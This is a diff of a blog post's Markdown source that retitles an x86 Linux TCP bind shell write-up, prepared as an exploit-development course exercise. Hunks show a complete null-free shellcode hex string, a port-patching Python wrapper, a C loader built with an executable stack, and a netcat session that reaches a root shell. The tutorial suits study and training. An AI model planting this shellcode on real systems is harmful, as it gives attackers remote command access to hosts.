@@ -1,10 +1,10 @@
 ---
 layout: post
-title: "SLAE32 - 1. TCP Bind Shell"
+title: "x86 TCP Bind Shell"
 ---
 
 ## Introduction:
-The first SLAE32 exercise that required a write up was the x86 bind shell, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output. 
+During my prep for OSCE, my first goal was to learn to create a bind shell in x86, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output. 
 
 ## Brief thoughts:
 The actual implementation of the TCP bind shell was relatively straight forward. Using a C based prototype I was able to make a list of required system calls and utilise the Linux man pages to confirm the arguments and how they would need to appear and be set up within the asm file. An important thing to remember is null bytes are bad. We don't want these to exist in our final project so simple tricks were used to get around these (i.e xor'ing registers with themselves to zero them). These will be highlighted when, and where, they are used.
@@ -107,8 +107,8 @@ int main(void){
 Compile and run:
 
 ```
-root@kali:~/Documents/slae32/misc# gcc test.c 
-root@kali:~/Documents/slae32/misc# ./a.out 
+root@kali:~/Documents/bindshell/misc# gcc test.c 
+root@kali:~/Documents/bindshell/misc# ./a.out 
 AF_INET: 2
 SOCK_STREAM: 1
 ```
@@ -200,7 +200,7 @@ int main(void){
 Compiling and executing the script gave me the following information:
 
 ```
-root@kali:~/Documents/slae32/misc# ./b.out 
+root@kali:~/Documents/bindshell/misc# ./b.out 
 AF_INET: 2
 INADDR_ANY: 0
 SIZE OF: 16
@@ -356,7 +356,7 @@ We should now have a fully functioning TCP bind shell, ready for assembling, lin
 I created a quick little script to help with assembling and linking my scripts, rather than having to issue 2 separate commands each time:
 
 ```
-root@kali:~/Documents/slae32/misc# cat build.sh 
+root@kali:~/Documents/bindshell/misc# cat build.sh 
 echo "Assembling $1.asm"
 nasm -f elf32 "$1".asm 
 
@@ -495,7 +495,7 @@ After playing around with the script for a while and testing a few things, I was
     * after removing each of these, I realised that this led to issues when making the system calls. I used strace to attempt to see what was going on. Looking at the following output snippet, we can see that the registers must have had junk left over before using them for our call - resulting in garbage values.
 
  ```
- root@kali:~/Documents/slae32/exercise_1/second_bind_shell# strace ./second_bind_shell 
+ root@kali:~/Documents/bindshell/bindshellsecond_bind_shell# strace ./second_bind_shell 
 execve("./second_bind_shell", ["./second_bind_shell"], 0xbfe76800 /* 41 vars */) = 0
 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 bind(3, {sa_family=AF_INET, sin_port=htons(9001), sin_addr=inet_addr("1.0.0.0")}, 16) = -1 EADDRNOTAVAIL (Cannot assign requested address)
@@ -613,14 +613,14 @@ Dumping the hex for usage:
 To extract our hex values for our shell, we can use the following shell script (dump_hex.sh) along with the target object to extract the hex values in a usable fashion. The output can be taken and placed directly into the following python wrapper.
 
 ```
-root@kali:~/Documents/slae32/misc# cat dump_hex.sh 
+root@kali:~/Documents/bindshell/misc# cat dump_hex.sh 
 objdump -d "$1" |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 ```
 
 Usage:
 
 ```
-root@kali:~/Documents/slae32/exercise_1/second_bind_shell# ../../misc/dump_hex.sh second_bind_shell
+root@kali:~/Documents/bindshell/bindshellsecond_bind_shell# ../../misc/dump_hex.sh second_bind_shell
 "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80"
 
 ```
@@ -635,7 +635,7 @@ The more logical solution would be to create a little tool, or wrapper, that tak
 The following script is a python wrapper that I have made to allow a custom port to be placed into the script, replacing the hard coded value within the final hex output.
 
 ```
-root@kali:~/Documents/slae32/exercise_1# cat wrapper.py 
+root@kali:~/Documents/bindshell# cat wrapper.py 
 import sys
 import socket
 
@@ -686,7 +686,7 @@ print shellcode
 As we can see in the above shellcode value, there are two placeholder values [p2] and [p1], these are the two hex values that are replaced with the target port, specified at runtime. Once edited, the final shellcode is output to the screen, as seen in the following usage example:
 
 ```
-root@kali:~/Documents/slae32/exercise_1# python wrapper.py 9003
+root@kali:~/Documents/bindshell# python wrapper.py 9003
 Chosen port: 9003
 1st port: \x2b
 2nd port: \x23
@@ -699,7 +699,7 @@ Final Shellcode:
 Our final step is to utilise this hex output within an executable that injects the shellcode directly into the process memory and executes it, binding out shell. This can be completed in various languages, for example C# is an ideal candidate for a Windows shell. As I am working within a Unix environment I wrote my executable in C.
 
 ```
-root@kali:~/Documents/slae32/exercise_1# cat shell.c
+root@kali:~/Documents/bindshell# cat shell.c
 #include<stdio.h>
 #include<string.h>
 
@@ -714,16 +714,13 @@ int main(void)  {
 
 Compiling and executing:
 ```
-root@kali:~/Documents/slae32/exercise_1# gcc -fno-stack-protector -z execstack shell.c -o shell
-root@kali:~/Documents/slae32/exercise_1# ./shell 
+root@kali:~/Documents/bindshell# gcc -fno-stack-protector -z execstack shell.c -o shell
+root@kali:~/Documents/bindshell# ./shell 
 Shellcode Length:  118
 
 root@kali:~# nc localhost 9003
 id
 uid=0(root) gid=0(root) groups=0(root)
 pwd
-/root/Documents/slae32/exercise_1
+/root/Documents/bindshell
 ```
-
-## Additional:
-todo - amend this section to include any course details ready for submission. For now, the write ups will just be live.
